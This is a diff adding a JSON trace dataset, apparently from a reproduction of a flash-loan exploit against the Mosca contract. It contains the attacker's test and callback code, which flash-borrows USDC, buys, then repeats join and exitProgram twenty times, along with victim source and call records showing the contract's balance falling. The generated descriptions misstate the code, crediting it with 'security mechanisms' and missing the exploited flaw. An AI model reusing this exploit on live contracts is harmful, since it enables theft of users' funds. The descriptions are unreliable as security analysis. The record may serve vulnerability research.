@@ -1,0 +1,1626 @@
+[
+    {
+        "id": "4531829",
+        "args": "",
+        "original_code": "    function testExploit() public balanceLog {\n        IERC20(USDC).approve(MOSCA, type(uint256).max);\n\n        uint256 amount = 30_000_000_000_000_000_000;\n        uint256 refCode = 0;\n        uint8 fiat = 2;\n        bool enterpriseJoin = false;\n        IMosca(MOSCA).join(amount, refCode, fiat, enterpriseJoin);\n\n        address recipient = address(this);\n        uint256 amount0 = 0;\n        uint256 amount1 = 1_000_000_000_000_000_000_000;\n        bytes memory data = abi.encode(amount1);\n        IPancakeV3Pool(PancakePool).flash(recipient, amount0, amount1, data);\n    }\n\n",
+        "description": "1. Core functions:  \nThe `testExploit` function is designed to perform a series of actions involving token approvals, joining a specific system, and executing a flash loan. It first approves a maximum allowance for a token (USDC) to be used by another contract (MOSCA). Then, it calls the `join` function on the MOSCA contract with specific parameters, such as a large amount, a reference code, a fiat type, and a flag for enterprise participation. Finally, it initiates a flash loan from a PancakeSwap pool, specifying a recipient, amounts, and encoded data.\n\n2. Security mechanism:  \nThe function uses the `balanceLog` modifier, which likely ensures that certain balance-related conditions are met before the function executes. Additionally, the function encodes data securely using `abi.encode` to prepare it for the flash loan call. However, the function does not include explicit checks for reentrancy or access control, which could be potential security risks.\n\n3. Parameter Function:  \n- `amount`: Represents a large numerical value used in the `join` function, likely indicating the amount of tokens involved.  \n- `refCode`: A reference code, possibly for tracking or identification purposes in the `join` function.  \n- `fiat`: A numerical value (2) that might specify a type of currency or payment method.  \n- `enterpriseJoin`: A boolean flag indicating whether the action is related to enterprise participation.  \n- `recipient`: The address that will receive the flash loan, set to the contract itself.  \n- `amount0` and `amount1`: Numerical values representing amounts for the flash loan, with `amount0` set to 0 and `amount1` set to a very large value.  \n- `data`: Encoded data passed to the flash loan function, containing `amount1`.\n\n4. Return description:  \nThe function does not return any value directly. Instead, it performs actions such as approving tokens, joining a system, and initiating a flash loan. The success of these actions depends on the external contracts (USDC, MOSCA, and PancakePool) and their implementations.  \n\nIn summary, the `testExploit` function is a sequence of operations involving token approvals, system participation, and a flash loan. It uses a modifier for balance checks and encodes data securely but lacks explicit security measures like reentrancy protection. The parameters define the amounts, codes, and flags used in these operations, and the function does not return a value but relies on external contracts for execution.",
+        "return_value": "Returned"
+    },
+    {
+        "id": "10328",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "\"USDC\""
+    },
+    {
+        "id": "3082",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "\"USDC\""
+    },
+    {
+        "id": "3296",
+        "args": "Mosca: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "30000000000000000000 [3e19]"
+    },
+    {
+        "id": "2553",
+        "args": "Mosca: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "30000000000000000000 [3e19]"
+    },
+    {
+        "id": "3076",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "18"
+    },
+    {
+        "id": "2336",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "18"
+    },
+    {
+        "id": "25308",
+        "args": "0x1962b3356122d6A56f978e112d14f5E23a25037D, 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "24562",
+        "args": "0x1962b3356122d6A56f978e112d14f5E23a25037D, 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "271916",
+        "args": "30000000000000000000 [3e19], 0, 2, false",
+        "original_code": "     function join(uint256 amount, uint256 _refCode, uint8 fiat, bool enterpriseJoin) external nonReentrant{\n           User storage user = users[msg.sender];\n           uint256 diff = user.balance > 127 * 10 ** 18 ? user.balance - 127 * 10 ** 18 : 0;\n            uint256 tax_remainder;\n\n           uint256 baseAmount = ((amount + diff) * 1000) / 1015;\n          \n       \n\n      \n            if(enterpriseJoin) {\n                \n                if(refByAddr[msg.sender] == 0) {\n                    require(amount >= (ENTERPRISE_JOIN_FEE * 3) + (JOIN_FEE * 3), \"Insufficient amount sent to join enterprise\");\n                    if(fiat == 1){\n                    require(usdt.transferFrom(msg.sender, address(this), amount - (ENTERPRISE_TAX * 3)), \"Transfer failed\");\n                    require(usdt.transferFrom(msg.sender, owner, ENTERPRISE_TAX * 3), \"Transfer tax failed\");\n                    } else {\n                        require(usdc.transferFrom(msg.sender, address(this), amount - (ENTERPRISE_TAX * 3)), \"Transfer failed\");\n                        require(usdc.transferFrom(msg.sender, owner, ENTERPRISE_TAX * 3), \"Transfer tax failed\");\n                    }\n\n\n                } else {\n                    \n                    require(amount + diff >= (ENTERPRISE_JOIN_FEE * 3), \"Insufficient amount to upgrade to enterprise\");\n                    if(diff < ENTERPRISE_TAX * 3){\n                        tax_remainder = (ENTERPRISE_TAX * 3) - diff;\n                        adminBalance+= (ENTERPRISE_TAX * 3) - diff;\n                        user.balance -= diff;\n                        diff = 0;\n                        \n\n                         if(fiat == 1){\n                            require(usdt.transferFrom(msg.sender, owner, tax_remainder), \"Transfer failed\");\n                        } else {\n                            require(usdc.transferFrom(msg.sender, owner, tax_remainder), \"Transfer failed\");\n                        }\n\n                    } else {\n                        adminBalance+= ENTERPRISE_TAX * 3;\n                        diff -= ENTERPRISE_TAX * 3;\n                         user.balance -= ENTERPRISE_TAX * 3; \n                        if(diff > ENTERPRISE_JOIN_FEE * 3){\n                            user.balance -= (ENTERPRISE_JOIN_FEE * 3);\n                        } else {\n                            user.balance -= diff;\n                        }\n                       \n\n                    }\n\n                      if(amount > 0) {\n\n                        if(fiat == 1){\n\n                            require(usdt.transferFrom(msg.sender, address(this), amount - tax_remainder), \"Transfer failed\");\n\n                        } else {\n\n                            require(usdc.transferFrom(msg.sender, address(this), amount - tax_remainder), \"Transfer failed\");\n\n                        }\n\n\n                        }\n                    \n                    \n\n                  \n\n                }\n                user.enterprise = true;\n            } else {\n\n                require(amount >= JOIN_FEE, \"Insufficient amount sent\");\n\n\n                if(fiat == 1){\n\n                    require(usdt.transferFrom(msg.sender, address(this), amount - (TAX * 3)), \"Transfer failed\");\n                    require(usdt.transferFrom(msg.sender, owner, TAX * 3), \"Transfer failed\");\n                } else {\n\n                     require(usdc.transferFrom(msg.sender, address(this), amount - (TAX * 3)), \"Transfer failed\");\n                    require(usdc.transferFrom(msg.sender, owner, TAX * 3), \"Transfer failed\");\n\n                }\n\n\n            }\n        \n        \n      \n       user.nextDeadline = block.timestamp + 28 days;\n       user.bonusDeadline = block.timestamp + 7 days;\n       user.walletAddress = msg.sender;\n        totalRevenue+= amount;\n        user.balance += enterpriseJoin ? baseAmount - ENTERPRISE_JOIN_FEE : baseAmount - JOIN_FEE;\n\n     \n\n        if(referrers[_refCode] != address(0)){\n            user.collectiveCode = _refCode;\n            users[referrers[user.collectiveCode]].balance += enterpriseJoin && users[referrers[user.collectiveCode]].enterprise ? (((90 * 10 ** 18) * 25 / 100)) : ((25 * 10 ** 18) * 25/ 100);\n            users[referrers[user.collectiveCode]].inviteCount++;\n            emit RewardEarned(referrers[user.collectiveCode], block.timestamp, enterpriseJoin && users[referrers[user.collectiveCode]].enterprise ? (((90 * 10 ** 18) * 25 / 100)) : ((25 * 10 ** 18) * 25/ 100));\n            if(users[referrers[user.collectiveCode]].inviteCount % 3 == 0){\n                users[referrers[user.collectiveCode]].balance += enterpriseJoin && users[referrers[user.collectiveCode]].enterprise ? (((90 * 10 ** 18) * 25 / 100)) : ((25 * 10 ** 18) * 25/ 100);\n                emit RewardEarned(referrers[user.collectiveCode], block.timestamp, enterpriseJoin && users[referrers[user.collectiveCode]].enterprise ? (((90 * 10 ** 18) * 25 / 100)) : ((25 * 10 ** 18) * 25/ 100));\n            }\n\n        }\n\n        rewardQueue.push(msg.sender);\n\n        if(refByAddr[msg.sender] == 0){\n        generateRefCode(msg.sender);\n        }\n\n        emit Joined(msg.sender, block.timestamp, amount, fiat);\n\n       cascade(msg.sender);\n\n        distributeFees(msg.sender, amount);\n        \n     }\n",
+        "description": "1. **Core functions**:  \n   The `join` function allows a user to participate in a system, either as a regular member or as an enterprise member. It handles the process of joining by checking the user's balance, calculating fees, and transferring funds. If the user chooses to join as an enterprise, additional checks and fee calculations are performed. The function also updates the user's balance, deadlines, and referral rewards if applicable. Additionally, it triggers events and other internal functions to manage rewards and fees distribution.\n\n2. **Security mechanism**:  \n   - **`nonReentrant` modifier**: Prevents reentrancy attacks by ensuring the function cannot be called again before it completes.  \n   - **`require` statements**: Ensure that the user sends sufficient funds and that token transfers are successful.  \n   - **Balance checks**: Verify that the user has enough balance to cover fees and taxes.  \n   - **Token transfer safeguards**: Ensure that token transfers to the contract and the owner are executed correctly.  \n\n3. **Parameter Function**:  \n   - **`amount`**: The amount of tokens the user wants to contribute.  \n   - **`_refCode`**: A referral code used to link the user to a referrer for rewards.  \n   - **`fiat`**: Indicates the type of token being used (e.g., USDT or USDC).  \n   - **`enterpriseJoin`**: A boolean flag to determine if the user is joining as an enterprise member.  \n\n4. **Return description**:  \n   The function does not return a value directly. Instead, it updates the user's balance, deadlines, and referral rewards based on the calculations performed. It also emits events to log the user's participation and rewards earned by referrers.  \n\n**In summary**, the `join` function manages user participation in a system, handling fees, balances, and rewards while ensuring security through checks and safeguards.",
+        "return_value": "Returned"
+    },
+    {
+        "id": "14386",
+        "args": "Mosca: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x1962b3356122d6A56f978e112d14f5E23a25037D, 21000000000000000000 [2.1e19]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "13634",
+        "args": "Mosca: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x1962b3356122d6A56f978e112d14f5E23a25037D, 21000000000000000000 [2.1e19]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "11586",
+        "args": "Mosca: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x2fE70eF3DB7eA49b5f14B5edf6208116458fa74a, 9000000000000000000 [9e18]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "10834",
+        "args": "Mosca: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x2fE70eF3DB7eA49b5f14B5edf6208116458fa74a, 9000000000000000000 [9e18]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "4172631",
+        "args": "Mosca: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0, 1000000000000000000000 [1e21], 0x00000000000000000000000000000000000000000000003635c9adc5dea00000",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "2531",
+        "args": "0x92b7807bF19b7DDdf89b706143896d05228f3121",
+        "original_code": null,
+        "description": null,
+        "return_value": "13986341869234771473452036 [1.398e25]"
+    },
+    {
+        "id": "3296",
+        "args": "0x92b7807bF19b7DDdf89b706143896d05228f3121",
+        "original_code": null,
+        "description": null,
+        "return_value": "4583852324446402108678012 [4.583e24]"
+    },
+    {
+        "id": "2553",
+        "args": "0x92b7807bF19b7DDdf89b706143896d05228f3121",
+        "original_code": null,
+        "description": null,
+        "return_value": "4583852324446402108678012 [4.583e24]"
+    },
+    {
+        "id": "6839",
+        "args": "Mosca: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1000000000000000000000 [1e21]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "6093",
+        "args": "Mosca: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1000000000000000000000 [1e21]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "4128359",
+        "args": "0, 100000000000000000 [1e17], 0x00000000000000000000000000000000000000000000003635c9adc5dea00000",
+        "original_code": "    function pancakeV3FlashCallback(uint256 fee0, uint256 fee1, bytes memory data) external {\n        (uint256 amount) = abi.decode(data, (uint256));\n        IMosca(MOSCA).buy(amount, true, 2);\n        IMosca(MOSCA).exitProgram();\n        \n        uint256 joinAmount = 30_000_000_000_000_000_000;\n        \n        for(uint256 i=0;i<20;i++) {\n            IMosca(MOSCA).join(joinAmount, 0, 2, false);\n            IMosca(MOSCA).exitProgram();\n        }\n\n        IERC20(USDC).transfer(msg.sender, amount+fee1);\n    }\n",
+        "description": "1. **Core functions**:  \n   This function is designed to handle a specific callback after a flash loan operation. It performs a series of actions:  \n   - It decodes the input data to retrieve an amount.  \n   - It uses this amount to execute a \"buy\" operation on a specific contract (MOSCA).  \n   - It then exits the program associated with the MOSCA contract.  \n   - After that, it repeatedly joins and exits the program 20 times with a fixed large amount.  \n   - Finally, it transfers a calculated amount of USDC tokens back to the caller, including an additional fee.  \n\n2. **Security mechanism**:  \n   - The function is marked as `external`, meaning it can only be called from outside the contract, ensuring it is not misused internally.  \n   - The use of `msg.sender` ensures that the transfer of USDC tokens is directed to the correct caller, preventing unauthorized access.  \n   - The function does not include any explicit access control modifiers, which could be a potential security risk if not managed elsewhere in the contract.  \n\n3. **Parameter Function**:  \n   - `fee0` and `fee1`: These parameters represent fees associated with the flash loan. They are used in the final transfer calculation.  \n   - `data`: This is encoded data passed to the function. It is decoded to retrieve the `amount` value, which is used in the \"buy\" operation and the final transfer.  \n\n4. **Return description**:  \n   The function does not return any value directly. Instead, it performs a transfer of USDC tokens to the caller. The amount transferred is calculated by adding the decoded `amount` and the `fee1` parameter. This ensures the caller receives the borrowed amount plus the associated fee.  \n\n**In summary**, this function processes a flash loan callback by executing a series of operations on the MOSCA contract, including buying, joining, and exiting the program. It then transfers the borrowed amount plus a fee back to the caller. The function lacks explicit access control, which could be a security concern if not addressed elsewhere.",
+        "return_value": "Returned"
+    },
+    {
+        "id": "39810",
+        "args": "1000000000000000000000 [1e21], true, 2",
+        "original_code": "     function buy(uint256 amount, bool buyFiat, uint8 fiat) external nonReentrant{\n        require(refByAddr[msg.sender] != 0, \"Cannot buy before activating citizenship\");\n           User storage user = users[msg.sender];\n\n        uint256 baseAmount = (amount * 1000)/1015;\n\n       \n        \n          \n        totalRevenue+= amount;\n        if(!buyFiat){\n             user.balance += baseAmount;\n             emit BoughtMosca(msg.sender,  block.timestamp, baseAmount);\n        } else {\n            if(fiat == 1) {\n                 user.balanceUSDT += baseAmount;\n                 emit BoughtUSDT(msg.sender,  block.timestamp, baseAmount);\n            } else {\n                user.balanceUSDC += baseAmount;\n                emit BoughtUSDC(msg.sender, block.timestamp, baseAmount);\n            } \n        }\n    \n\n         if(fiat == 1) {\n           require(usdt.transferFrom(msg.sender, address(this), amount), \"Transfer failed\"); \n            \n            } else {\n                require(usdc.transferFrom(msg.sender, address(this), amount), \"Transfer failed\");\n               \n\n            }\n\n\n        distributeFees(msg.sender, amount);\n        \n     }\n\n\n",
+        "description": "1. **Core functions:**  \n   The `buy` function allows a user to purchase tokens or fiat currency (like USDT or USDC) based on their input. It calculates the base amount of tokens or fiat the user will receive, updates the user's balance, and records the transaction. Additionally, it transfers the specified amount of fiat currency from the user to the contract and distributes fees associated with the transaction.\n\n2. **Security mechanism:**  \n   - The `nonReentrant` modifier prevents reentrancy attacks, ensuring the function cannot be called repeatedly before it completes.  \n   - The `require` statement checks if the user has activated citizenship before allowing them to buy, ensuring only eligible users can proceed.  \n   - Another `require` statement ensures the transfer of fiat currency (USDT or USDC) from the user to the contract is successful, preventing incomplete or failed transactions.  \n\n3. **Parameter Function:**  \n   - `amount`: Specifies the amount of tokens or fiat currency the user wants to buy.  \n   - `buyFiat`: A boolean flag that determines whether the user is buying fiat currency (true) or tokens (false).  \n   - `fiat`: An integer (1 or 0) that specifies the type of fiat currency (e.g., USDT or USDC) the user is buying.  \n\n4. **Return description:**  \n   The function does not return a value directly. Instead, it updates the user's balance (either tokens or fiat) based on the `baseAmount` calculation. The `baseAmount` is derived by adjusting the input `amount` using a fixed formula (`(amount * 1000) / 1015`). This adjusted amount is then added to the user's balance, and the transaction is logged using an event (`emit`).  \n\n**In summary,**  \nThe `buy` function enables users to purchase tokens or fiat currency while ensuring security through reentrancy protection and transaction validation. It calculates the adjusted amount, updates the user's balance, and handles the transfer of funds, all while logging the transaction for transparency.",
+        "return_value": "Returned"
+    },
+    {
+        "id": "6786",
+        "args": "Mosca: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x1962b3356122d6A56f978e112d14f5E23a25037D, 1000000000000000000000 [1e21]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "6034",
+        "args": "Mosca: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x1962b3356122d6A56f978e112d14f5E23a25037D, 1000000000000000000000 [1e21]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "365830",
+        "args": "",
+        "original_code": "   function exitProgram() external nonReentrant {\n    require(!isBlacklisted[msg.sender], \"Blacklisted user\");\n    User storage user = users[msg.sender];\n\n    address referrer = referrers[user.collectiveCode];\n    if (referrer != address(0) && users[referrer].inviteCount > 0) {\n        users[referrer].inviteCount--;\n    }\n\n    for (uint256 i = 0; i < rewardQueue.length; i++) {\n        address userAddr = rewardQueue[i];\n        if (userAddr == msg.sender) {\n            // Perform withdrawal before modifying user state\n            withdrawAll(msg.sender);\n\n            // Remove user from reward queue and reset state\n            refByAddr[userAddr] = 0;\n            referrers[user.refCode] = 0x000000000000000000000000000000000000dEaD;\n            user.balance = 0;\n            user.enterprise = false;\n\n            rewardQueue[i] = rewardQueue[rewardQueue.length - 1];\n            rewardQueue.pop();\n\n            emit ExitProgram(msg.sender, block.timestamp);\n        }\n    }\n}\n   \n    \n\n\n    \n\n    \n    \n",
+        "description": "1. **Core functions**:  \n   The `exitProgram` function allows a user to exit a program or system. When a user decides to leave, the function performs several tasks: it checks if the user is blacklisted, updates the referrer's invite count if applicable, processes any rewards the user might have, and then resets the user's state. This includes removing the user from the reward queue, clearing their balance, and marking them as no longer part of an enterprise. Finally, an event is emitted to log the exit.\n\n2. **Security mechanism**:  \n   The function uses the `nonReentrant` modifier to prevent reentrancy attacks, which could allow malicious actors to exploit the function by calling it repeatedly before it completes. Additionally, it checks if the user is blacklisted using `require`, ensuring blacklisted users cannot exit the program. These measures help protect the system from unauthorized or harmful actions.\n\n3. **Parameter Function**:  \n   The function does not take any explicit parameters. Instead, it uses `msg.sender`, which represents the address of the user calling the function. This ensures that the function operates on the correct user's data and prevents unauthorized access to other users' information.\n\n4. **Return description**:  \n   The function does not return any value. Instead, it performs actions such as updating the referrer's invite count, processing rewards, and resetting the user's state. These actions are executed based on the user's current status and their relationship with the system.\n\n**In summary**,  \nThe `exitProgram` function allows a user to leave the program securely. It ensures the user is not blacklisted, updates relevant data like the referrer's invite count, processes rewards, and resets the user's state. Security measures like the `nonReentrant` modifier and blacklist check protect the system from misuse. The function operates on the caller's address (`msg.sender`) and does not return any value, focusing instead on updating the system state.",
+        "return_value": "Returned"
+    },
+    {
+        "id": "1296",
+        "args": "0x1962b3356122d6A56f978e112d14f5E23a25037D",
+        "original_code": null,
+        "description": null,
+        "return_value": "12942680000000000000000 [1.294e22]"
+    },
+    {
+        "id": "553",
+        "args": "0x1962b3356122d6A56f978e112d14f5E23a25037D",
+        "original_code": null,
+        "description": null,
+        "return_value": "12942680000000000000000 [1.294e22]"
+    },
+    {
+        "id": "4039",
+        "args": "Mosca: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 986778325123152709359 [9.867e20]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "3293",
+        "args": "Mosca: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 986778325123152709359 [9.867e20]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "92216",
+        "args": "30000000000000000000 [3e19], 0, 2, false",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "6786",
+        "args": "Mosca: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x1962b3356122d6A56f978e112d14f5E23a25037D, 21000000000000000000 [2.1e19]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "6034",
+        "args": "Mosca: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x1962b3356122d6A56f978e112d14f5E23a25037D, 21000000000000000000 [2.1e19]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "6786",
+        "args": "Mosca: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x2fE70eF3DB7eA49b5f14B5edf6208116458fa74a, 9000000000000000000 [9e18]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "6034",
+        "args": "Mosca: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x2fE70eF3DB7eA49b5f14B5edf6208116458fa74a, 9000000000000000000 [9e18]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "91830",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "1296",
+        "args": "0x1962b3356122d6A56f978e112d14f5E23a25037D",
+        "original_code": null,
+        "description": null,
+        "return_value": "11976901674876847290641 [1.197e22]"
+    },
+    {
+        "id": "553",
+        "args": "0x1962b3356122d6A56f978e112d14f5E23a25037D",
+        "original_code": null,
+        "description": null,
+        "return_value": "11976901674876847290641 [1.197e22]"
+    },
+    {
+        "id": "4039",
+        "args": "Mosca: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 986778325123152709359 [9.867e20]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "3293",
+        "args": "Mosca: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 986778325123152709359 [9.867e20]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "92216",
+        "args": "30000000000000000000 [3e19], 0, 2, false",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "6786",
+        "args": "Mosca: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x1962b3356122d6A56f978e112d14f5E23a25037D, 21000000000000000000 [2.1e19]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "6034",
+        "args": "Mosca: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x1962b3356122d6A56f978e112d14f5E23a25037D, 21000000000000000000 [2.1e19]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "6786",
+        "args": "Mosca: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x2fE70eF3DB7eA49b5f14B5edf6208116458fa74a, 9000000000000000000 [9e18]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "6034",
+        "args": "Mosca: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x2fE70eF3DB7eA49b5f14B5edf6208116458fa74a, 9000000000000000000 [9e18]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "91830",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "1296",
+        "args": "0x1962b3356122d6A56f978e112d14f5E23a25037D",
+        "original_code": null,
+        "description": null,
+        "return_value": "11011123349753694581282 [1.101e22]"
+    },
+    {
+        "id": "553",
+        "args": "0x1962b3356122d6A56f978e112d14f5E23a25037D",
+        "original_code": null,
+        "description": null,
+        "return_value": "11011123349753694581282 [1.101e22]"
+    },
+    {
+        "id": "4039",
+        "args": "Mosca: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 986778325123152709359 [9.867e20]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "3293",
+        "args": "Mosca: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 986778325123152709359 [9.867e20]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "92216",
+        "args": "30000000000000000000 [3e19], 0, 2, false",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "6786",
+        "args": "Mosca: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x1962b3356122d6A56f978e112d14f5E23a25037D, 21000000000000000000 [2.1e19]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "6034",
+        "args": "Mosca: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x1962b3356122d6A56f978e112d14f5E23a25037D, 21000000000000000000 [2.1e19]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "6786",
+        "args": "Mosca: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x2fE70eF3DB7eA49b5f14B5edf6208116458fa74a, 9000000000000000000 [9e18]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "6034",
+        "args": "Mosca: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x2fE70eF3DB7eA49b5f14B5edf6208116458fa74a, 9000000000000000000 [9e18]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "91830",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "1296",
+        "args": "0x1962b3356122d6A56f978e112d14f5E23a25037D",
+        "original_code": null,
+        "description": null,
+        "return_value": "10045345024630541871923 [1.004e22]"
+    },
+    {
+        "id": "553",
+        "args": "0x1962b3356122d6A56f978e112d14f5E23a25037D",
+        "original_code": null,
+        "description": null,
+        "return_value": "10045345024630541871923 [1.004e22]"
+    },
+    {
+        "id": "4039",
+        "args": "Mosca: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 986778325123152709359 [9.867e20]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "3293",
+        "args": "Mosca: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 986778325123152709359 [9.867e20]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "92216",
+        "args": "30000000000000000000 [3e19], 0, 2, false",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "6786",
+        "args": "Mosca: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x1962b3356122d6A56f978e112d14f5E23a25037D, 21000000000000000000 [2.1e19]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "6034",
+        "args": "Mosca: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x1962b3356122d6A56f978e112d14f5E23a25037D, 21000000000000000000 [2.1e19]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "6786",
+        "args": "Mosca: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x2fE70eF3DB7eA49b5f14B5edf6208116458fa74a, 9000000000000000000 [9e18]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "6034",
+        "args": "Mosca: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x2fE70eF3DB7eA49b5f14B5edf6208116458fa74a, 9000000000000000000 [9e18]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "91830",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "1296",
+        "args": "0x1962b3356122d6A56f978e112d14f5E23a25037D",
+        "original_code": null,
+        "description": null,
+        "return_value": "9079566699507389162564 [9.079e21]"
+    },
+    {
+        "id": "553",
+        "args": "0x1962b3356122d6A56f978e112d14f5E23a25037D",
+        "original_code": null,
+        "description": null,
+        "return_value": "9079566699507389162564 [9.079e21]"
+    },
+    {
+        "id": "4039",
+        "args": "Mosca: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 986778325123152709359 [9.867e20]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "3293",
+        "args": "Mosca: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 986778325123152709359 [9.867e20]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "92216",
+        "args": "30000000000000000000 [3e19], 0, 2, false",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "6786",
+        "args": "Mosca: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x1962b3356122d6A56f978e112d14f5E23a25037D, 21000000000000000000 [2.1e19]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "6034",
+        "args": "Mosca: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x1962b3356122d6A56f978e112d14f5E23a25037D, 21000000000000000000 [2.1e19]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "6786",
+        "args": "Mosca: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x2fE70eF3DB7eA49b5f14B5edf6208116458fa74a, 9000000000000000000 [9e18]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "6034",
